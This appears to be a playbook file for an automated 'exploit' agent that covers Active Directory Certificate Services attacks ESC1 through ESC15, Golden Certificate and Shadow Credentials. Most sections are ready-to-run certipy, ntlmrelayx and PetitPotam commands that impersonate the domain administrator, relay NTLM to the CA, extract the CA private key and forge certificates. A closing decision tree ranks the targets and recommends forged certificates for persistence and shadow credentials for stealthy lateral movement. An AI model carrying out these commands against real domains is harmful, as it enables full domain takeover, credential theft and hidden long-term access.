---
name: adcs-attacks
version: 1.0.0
description: >
  Active Directory Certificate Services (ADCS) attack reference covering
  ESC1 through ESC15 vulnerability classes, Golden Certificate, and Shadow
  Credentials. Primary tool: certipy-ad. Based on SpecterOps research
  (Certified Pre-Owned) and subsequent community extensions.
phases: [3, 4]
agents: [exploit]
sources:
  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
  - https://github.com/ly4k/Certipy
  - https://www.thehacker.recipes/ad/movement/adcs/
  - https://attack.mitre.org/techniques/T1649/
---

# ADCS Attacks — ESC1 through ESC15 + Golden Certificate + Shadow Credentials

> **Primary tool:** certipy-ad
> **Pi5 ARM64 note:** Use `--timeout 120` for large domains (>500 templates).
> certipy-ad may crash on ARM64 with very large CA environments. If crashes
> persist, reduce scope with `-ca $SPECIFIC_CA` instead of enumerating all CAs.

## STEP 1: ENUMERATE ADCS ENVIRONMENT

**MITRE:** T1649 (Steal or Forge Authentication Certificates)

```bash
# Full ADCS enumeration — find all vulnerable templates
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -vulnerable -stdout --timeout 120 \
  | tee -a loot/phase3/certipy_enum_$DC.out

# Save full output (JSON) for later analysis
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -vulnerable --timeout 120 -output loot/phase3/certipy_$DOMAIN \
  | tee -a loot/phase3/certipy_enum_full_$DC.out
```

**Key output to look for:**
- "ESC1" through "ESC15" tags on templates
- Certificate Authorities with EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6)
- Web enrollment endpoints enabled (ESC8)
- Templates with enrollment rights for low-privilege groups

---

## ESC1: MISCONFIGURED CERTIFICATE TEMPLATE — CLIENT AUTH + ENROLLEE SUPPLIES SUBJECT

**What:** Template allows enrollee to specify Subject Alternative Name (SAN)
AND grants enrollment to low-privilege users AND enables client authentication.

**Impact:** Request certificate as any user (including DA), authenticate with it.

```bash
# Request certificate with arbitrary SAN (impersonate DA)
certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template $TEMPLATE_NAME \
  -upn Administrator@$DOMAIN --timeout 120 \
  | tee -a loot/phase4/certipy_esc1_$TEMPLATE_NAME.out

# Authenticate with the certificate
certipy auth -pfx Administrator.pfx -dc-ip $DC \
  | tee -a loot/phase4/certipy_esc1_auth.out
```

## ESC2: MISCONFIGURED TEMPLATE — ANY PURPOSE OR SUBORDINATE CA

**What:** Template has "Any Purpose" EKU or no EKU (SubCA). Can be used for
any purpose including client auth. Combined with enrollment rights for
low-privilege users.

```bash
certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template $TEMPLATE_NAME --timeout 120 \
  | tee -a loot/phase4/certipy_esc2_$TEMPLATE_NAME.out
```

## ESC3: ENROLLMENT AGENT TEMPLATE ABUSE

**What:** Two-step attack. Template 1 has "Certificate Request Agent" EKU.
Template 2 allows enrollment on behalf of another user. Chain them to
enroll as any user.

```bash
# Step 1: Get enrollment agent certificate
certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template $AGENT_TEMPLATE --timeout 120 \
  | tee -a loot/phase4/certipy_esc3_step1.out

# Step 2: Use agent cert to request on behalf of DA
certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template $TARGET_TEMPLATE \
  -on-behalf-of "$DOMAIN\\Administrator" \
  -pfx $AGENT_PFX --timeout 120 \
  | tee -a loot/phase4/certipy_esc3_step2.out
```

## ESC4: VULNERABLE CERTIFICATE TEMPLATE ACLs

**What:** Low-privilege user has write access to a certificate template object
(WriteDACL, WriteOwner, WriteProperty). Modify template to make it vulnerable
to ESC1, then exploit ESC1.

```bash
# Modify template to enable ESC1 conditions
certipy template -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -template $TEMPLATE_NAME -save-old --timeout 120 \
  | tee -a loot/phase4/certipy_esc4_modify.out

# Now exploit as ESC1 (see ESC1 above)
# After exploitation, restore original template:
certipy template -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -template $TEMPLATE_NAME -configuration $TEMPLATE_NAME.json \
  --timeout 120 | tee -a loot/phase4/certipy_esc4_restore.out
```

## ESC5: VULNERABLE PKI OBJECT ACLs

**What:** Low-privilege user has control over PKI objects beyond templates:
CA server object, RootCA cert object, NTAuthCertificates, Enrollment Services
container. Broader than ESC4.

**Detection:** BloodHound CE or manual ACL review on PKI containers in AD.

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 FLAG ON CA

**What:** CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled, which allows
ANY enrollee to specify a SAN in ANY template request. Makes all templates
effectively ESC1.

```bash
# Check flag (visible in certipy find output)
# If flag is set, any template with client auth becomes ESC1-equivalent

certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template User \
  -upn Administrator@$DOMAIN --timeout 120 \
  | tee -a loot/phase4/certipy_esc6.out
```

## ESC7: VULNERABLE CA ACLs (ManageCA / ManageCertificates)

**What:** Low-privilege user has ManageCA or ManageCertificates permissions on
the CA itself. ManageCA can enable ESC6 flag. ManageCertificates can approve
pending requests.

```bash
# If ManageCA: enable ESC6 flag, then exploit ESC6
certipy ca -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 \
  --timeout 120 | tee -a loot/phase4/certipy_esc7_enable.out

# If ManageCertificates: issue a pending request
certipy ca -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -issue-request $REQUEST_ID --timeout 120 \
  | tee -a loot/phase4/certipy_esc7_issue.out
```

## ESC8: NTLM RELAY TO ADCS HTTP ENROLLMENT

**What:** CA has HTTP enrollment endpoint (certsrv). Relay NTLM authentication
to this endpoint to request a certificate as the relayed user.

```bash
# Set up relay to ADCS HTTP enrollment
ntlmrelayx.py -t http://$CA_HOST/certsrv/certfnsh.asp \
  -smb2support --adcs --template $TEMPLATE \
  | tee -a loot/phase2/ntlmrelayx_esc8.out

# Combine with coercion (PetitPotam -> relay DC to ADCS)
python3 PetitPotam.py $LISTENER_IP $DC \
  | tee -a loot/phase2/petitpotam_esc8.out

# After relay captures certificate, authenticate:
certipy auth -pfx $CAPTURED_PFX -dc-ip $DC \
  | tee -a loot/phase4/certipy_esc8_auth.out
```

**ESC8 is often exploitable without any credentials** (PetitPotam unauthenticated
+ NTLM relay to ADCS web enrollment). High priority in Phase 2.

## ESC9: NO SECURITY EXTENSION (CT_FLAG_NO_SECURITY_EXTENSION)

**What:** Template has msPKI-Enrollment-Flag with CT_FLAG_NO_SECURITY_EXTENSION.
The certificate does not embed the user's SID, allowing name mapping abuse.

## ESC10: WEAK CERTIFICATE MAPPING

**What:** Two variants based on registry keys:
- StrongCertificateBindingEnforcement = 0 (ESC10a)
- CertificateMappingMethods contains UPN mapping (ESC10b)

Allows mapping certificates to different accounts via UPN manipulation.

## ESC11: NTLM RELAY TO ADCS RPC ENROLLMENT (ICPR)

**What:** CA accepts RPC enrollment without enforcing Integrity/Encryption.
Relay NTLM to the RPC endpoint (MS-ICPR) instead of HTTP.

```bash
certipy relay -ca $CA_HOST -template $TEMPLATE \
  | tee -a loot/phase4/certipy_esc11.out
```

## ESC12: CA USES YUBIKEY / HSM WITH EXTRACTABLE KEY

**What:** CA private key stored on YubiKey with default PIN or extractable.
Rare but devastating if exploitable.

## ESC13: ISSUANCE POLICY WITH OID GROUP LINK

**What:** Certificate template has issuance policy OID linked to a group.
Enrolling in template grants group membership via certificate.

```bash
certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template $TEMPLATE --timeout 120 \
  | tee -a loot/phase4/certipy_esc13.out
```

## ESC14: EXPLICIT CERTIFICATE MAPPING (altSecurityIdentities)

**What:** Certificate mapping via altSecurityIdentities attribute allows
impersonation when weak mapping modes are in use.

## ESC15: APPLICATION POLICIES EKU OVERRIDE (CVE-2024-49019)

**What:** Templates using schema version 1 or version 2+ with an
Application Policy specifying "Certificate Request Agent" EKU can bypass
intended EKU restrictions. Allows enrollment agent abuse similar to ESC3.

```bash
# Exploit like ESC3 if Application Policy contains CRA EKU
certipy req -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -ca $CA_NAME -template $TEMPLATE --timeout 120 \
  | tee -a loot/phase4/certipy_esc15.out
```

---

## GOLDEN CERTIFICATE ATTACK

**What:** Extract the CA private key. Forge any certificate for any user.
Requires DA or CA server admin access.

```bash
# Backup CA certificate and private key (requires admin on CA)
certipy ca -u $DA_USER@$DOMAIN -p "$DA_PASS" -dc-ip $DC \
  -ca $CA_NAME -backup --timeout 120 \
  | tee -a loot/phase5/certipy_golden_cert_backup.out

# Forge certificate as any user
certipy forge -ca-pfx $CA_PFX -upn Administrator@$DOMAIN \
  -subject 'CN=Administrator,CN=Users,DC=$DC1,DC=$DC2' \
  | tee -a loot/phase5/certipy_golden_cert_forge.out

# Authenticate with forged certificate
certipy auth -pfx Administrator_forged.pfx -dc-ip $DC \
  | tee -a loot/phase5/certipy_golden_cert_auth.out
```

**Golden Certificate is PERSISTENT** — unlike Golden Ticket (invalidated by
krbtgt password rotation), Golden Certificate persists until the CA cert expires
or is revoked. CA certs typically valid for 5-20 years.

---

## SHADOW CREDENTIALS ATTACK

**MITRE:** T1556 (Modify Authentication Process)

**What:** Write to a target's msDS-KeyCredentialLink attribute to add an
attacker-controlled key credential. Authenticate as that target via PKINIT.
Requires write access to the target object (GenericAll, GenericWrite, or
specific write to msDS-KeyCredentialLink).

```bash
# Add shadow credential to target (e.g., computer account or user)
certipy shadow auto -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -account $TARGET_ACCOUNT --timeout 120 \
  | tee -a loot/phase4/certipy_shadow_$TARGET_ACCOUNT.out

# Output: NT hash and/or TGT for the target account
```

**Use case:** If you have GenericAll on a computer object, Shadow Credentials
lets you authenticate as that machine account without needing to modify its
password (less detectable than RBCD in some environments).

---

## ADCS PRIORITIZATION DECISION TREE

```
ADCS Enumeration Complete (certipy find -vulnerable)
  |
  +-> ESC8 found (HTTP enrollment)?
  |     -> HIGHEST PRIORITY (no creds needed with PetitPotam relay)
  |     -> Attempt in Phase 2 before other credential attacks
  |
  +-> ESC1 found (enrollee supplies subject + client auth)?
  |     -> HIGH PRIORITY (simple exploitation, direct DA impersonation)
  |
  +-> ESC4 found (writable template ACLs)?
  |     -> HIGH (modify to ESC1, exploit, restore)
  |
  +-> ESC7 found (ManageCA permissions)?
  |     -> MEDIUM-HIGH (enable ESC6, exploit, disable)
  |
  +-> ESC6 found (EDITF flag)?
  |     -> MEDIUM (any template becomes ESC1, but requires enrollment)
  |
  +-> ESC3 found (enrollment agent)?
  |     -> MEDIUM (two-step, but reliable)
  |
  +-> ESC9-ESC15 found?
  |     -> MEDIUM-LOW (newer variants, environment-dependent)
  |
  +-> No ESC vulnerabilities?
  |     -> Skip ADCS, pursue other attack vectors
  |
  +-> Got DA access?
       -> Golden Certificate for persistence
       -> Shadow Credentials for stealthy lateral movement
```
